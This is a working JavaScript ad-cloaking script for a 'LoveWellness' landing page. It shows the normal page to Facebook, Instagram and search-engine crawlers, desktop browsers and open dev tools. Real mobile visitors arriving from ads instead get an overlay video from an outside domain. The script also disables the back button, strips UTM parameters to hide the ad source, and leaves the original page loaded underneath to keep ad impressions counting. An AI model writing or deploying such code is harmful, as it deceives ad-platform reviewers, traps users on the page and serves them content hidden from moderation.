    <!-- UTM Source Cloaking Script -->
    <script>
        // Back button prevention (only for cloaking mode)
        function preventBackButton() {
            history.pushState(null, null, document.URL);
            window.addEventListener('popstate', () => {
                window.location.href = window.location.href;
            });
        }
        
        // Check if utm_source parameter exists
        function hasUTMSource() {
            const params = new URLSearchParams(window.location.search);
            const utmSource = params.get('utm_source') || params.get('source');
            return utmSource && utmSource.length > 0;
        }
        
        // Check if bot (Facebook, Instagram, etc.) - MUST BE FIRST CHECK
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            
            // Facebook bot patterns (most important - check first)
            const facebookBots = [
                'facebookexternalhit',
                'facebookcatalog',
                'facebot',
                'facebook',
                'fban',
                'fbav'
            ];
            
            // Instagram bot patterns
            const instagramBots = [
                'instagram',
                'instagrambot'
            ];
            
            // Other social media bots
            const socialBots = [
                'twitterbot',
                'linkedinbot',
                'whatsapp',
                'telegram',
                'pinterest',
                'snapchat'
            ];
            
            // Search engine bots
            const searchBots = [
                'googlebot',
                'bingbot',
                'slurp',
                'duckduckbot',
                'baiduspider',
                'yandexbot',
                'sogou',
                'exabot',
                'ia_archiver'
            ];
            
            // Generic bot patterns
            const genericBots = [
                'crawler',
                'spider',
                'bot',
                'scraper',
                'headless'
            ];
            
            // Check all bot patterns
            const allBots = [...facebookBots, ...instagramBots, ...socialBots, ...searchBots, ...genericBots];
            
            // Check user agent
            if (allBots.some(pattern => ua.includes(pattern))) {
                return true;
            }
            
            // Additional check: If no user agent or very short, likely bot
            if (!ua || ua.length < 10) {
                return true;
            }
            
            // Check referrer for Facebook/Instagram
            const referrer = document.referrer.toLowerCase();
            if (referrer.includes('facebook.com') || referrer.includes('instagram.com')) {
                // If coming from Facebook/Instagram but user agent doesn't match mobile pattern, likely bot
                const mobilePattern = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i;
                if (!mobilePattern.test(ua)) {
                    return true;
                }
            }
            
            return false;
        }
        
        // Check if mobile device
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
        }
        
        // Check if desktop or dev tools
        function isDesktopOrDevTools() {
            // Check screen width (desktop typically > 768px)
            if (window.innerWidth > 768) {
                return true;
            }
            
            // Check if dev tools are open (common detection methods)
            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                return true;
            }
            
            // Check for desktop user agents
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
                if (!ua.includes('mobile') && !ua.includes('android')) {
                    return true;
                }
            }
            
            return false;
        }
        
        // Main cloaking function
        function checkCloaking() {
            // CRITICAL: Always show normal LoveWellness page to bots FIRST (even if they have UTM source)
            // This ensures Facebook/Instagram bots see normal page regardless of UTM parameters
            if (isBot()) {
                return; // Exit immediately - show normal LoveWellness page
            }
            
            // Always show normal LoveWellness page on desktop/dev tools
            if (isDesktopOrDevTools()) {
                return; // Exit immediately - show normal LoveWellness page
            }
            
            // Only show cloaking on mobile devices
            if (!isMobile()) {
                return; // Exit immediately - show normal page
            }
            
            // At this point: Real mobile user, not a bot, not desktop
            // Check if should activate (UTM source present OR session storage active)
            const shouldActivate = hasUTMSource() || sessionStorage.getItem('cloaking_active');
            
            if (shouldActivate) {
                // Prevent back button
                preventBackButton();
                
                // DON'T hide original content - keep it visible for ad impressions
                // Original page stays loaded behind the overlay
                
                // Show cloaking elements as overlay
                const cloakingVideo = document.querySelector('.cloaking-video');
                const cloakingBackground = document.querySelector('.cloaking-background');
                
                if (cloakingVideo) cloakingVideo.style.display = 'flex';
                if (cloakingBackground) {
                    cloakingBackground.style.display = 'block';
                    // Add class to body but don't hide original content
                    document.body.classList.add('cloaking-active');
                }
                
                // Set video source and autoplay
                const video = document.getElementById('videoplayer');
                const playPauseBtn = document.getElementById('playPauseButton');
                const videoContainer = document.getElementById('cloakingVideoContainer');
                const playIcon = document.getElementById('playIcon');
                const pauseIcon = document.getElementById('pauseIcon');
                
                if (video) {
                    video.src = 'https://blackmekemeke.com/MOV/VID20.webm';
                    
                    // Video pause at 6 seconds
                    let pauseTimeout;
                    video.addEventListener('play', () => {
                        clearTimeout(pauseTimeout);
                        pauseTimeout = setTimeout(() => {
                            if (!video.paused) {
                                video.pause();
                                // Show pause icon
                                if (playIcon) playIcon.style.display = 'none';
                                if (pauseIcon) pauseIcon.style.display = 'block';
                                if (videoContainer) videoContainer.classList.add('video-paused');
                            }
                        }, 6000); // 6 seconds
                    });
                    
                    // Play/pause button functionality
                    if (playPauseBtn) {
                        playPauseBtn.addEventListener('click', (e) => {
                            e.stopPropagation();
                            if (video.paused) {
                                video.play();
                                if (playIcon) playIcon.style.display = 'none';
                                if (pauseIcon) pauseIcon.style.display = 'block';
                                if (videoContainer) videoContainer.classList.remove('video-paused');
                            } else {
                                video.pause();
                                if (playIcon) playIcon.style.display = 'block';
                                if (pauseIcon) pauseIcon.style.display = 'none';
                                if (videoContainer) videoContainer.classList.add('video-paused');
                            }
                        });
                    }
                    
                    // Update button on video pause/play
                    video.addEventListener('pause', () => {
                        if (playIcon) playIcon.style.display = 'block';
                        if (pauseIcon) pauseIcon.style.display = 'none';
                        if (videoContainer) videoContainer.classList.add('video-paused');
                    });
                    
                    video.addEventListener('play', () => {
                        if (playIcon) playIcon.style.display = 'none';
                        if (pauseIcon) pauseIcon.style.display = 'block';
                        if (videoContainer) videoContainer.classList.remove('video-paused');
                    });
                }
                
                // Set session storage if UTM source is present
                if (hasUTMSource()) {
                    sessionStorage.setItem('cloaking_active', 'true');
                    
                    // Clean URL (remove UTM parameters)
                    try {
                        const url = new URL(window.location.href);
                        url.searchParams.delete('utm_source');
                        url.searchParams.delete('source');
                        url.searchParams.delete('utm_medium');
                        url.searchParams.delete('utm_campaign');
                        url.searchParams.delete('utm_term');
                        url.searchParams.delete('utm_content');
                        history.replaceState(null, '', url.pathname + url.search + url.hash);
                    } catch(e) {}
                }
                
                // Close button handler
                const closeBtn = document.getElementById('closeVideoButton');
                if (closeBtn) {
                    closeBtn.onclick = function() {
                        sessionStorage.removeItem('cloaking_active');
                        document.body.classList.remove('cloaking-active');
                        location.reload();
                    };
                }
            }
        }
        
        // Start when page loads
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', checkCloaking);
        } else {
            checkCloaking();
        }
  </script>
